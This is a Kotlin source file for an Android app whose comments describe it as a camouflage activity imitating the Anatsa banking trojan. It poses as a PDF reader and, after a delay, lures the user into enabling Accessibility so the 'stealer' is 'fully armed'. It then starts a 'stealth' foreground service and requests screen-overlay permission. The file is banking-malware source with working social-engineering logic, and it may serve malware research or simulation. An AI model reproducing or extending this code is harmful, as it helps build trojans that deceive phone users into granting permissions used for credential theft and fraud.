package com.docreader.lite

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.docreader.lite.reader.BackgroundSyncService

/**
 * Camouflage activity — looks like a PDF reader.
 * Shows "recent documents" list + prompts for Accessibility enable.
 *
 * Real banker strategy (Anatsa):
 *   - Show legitimate-looking UI on first launch
 *   - After 2-3 uses, pop the "enable accessibility for better reading" dialog
 *   - Once user grants → stealer fully armed, camouflage no longer needed
 *   - Some variants hide icon from launcher after grant
 */
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Check if accessibility is already enabled
        if (!isAccessibilityEnabled()) {
            // Delayed prompt — more realistic than immediate ask
            window.decorView.postDelayed({
                promptAccessibility()
            }, 3000)
        } else {
            // Already armed — start stealth FG service
            startStealthService()
        }

        // Handle if launched with a PDF intent (maintains camouflage)
        handlePdfIntent(intent)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handlePdfIntent(intent)
    }

    private fun handlePdfIntent(intent: Intent?) {
        if (intent?.action == Intent.ACTION_VIEW && intent.data != null) {
            // Real PDF reader would render here. We just show a toast.
            Toast.makeText(this, "Opening document...", Toast.LENGTH_SHORT).show()
        }
    }

    private fun promptAccessibility() {
        // Navigate to the enable-accessibility lure screen
        startActivity(Intent(this, EnableAccessibilityActivity::class.java))
    }

    private fun startStealthService() {
        val intent = Intent(this, BackgroundSyncService::class.java)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabled = am.getEnabledAccessibilityServiceList(
            AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        )
        return enabled.any {
            it.resolveInfo.serviceInfo.packageName == packageName
        }
    }

    fun requestOverlayPermission() {
        if (!Settings.canDrawOverlays(this)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            startActivity(intent)
        }
    }
}
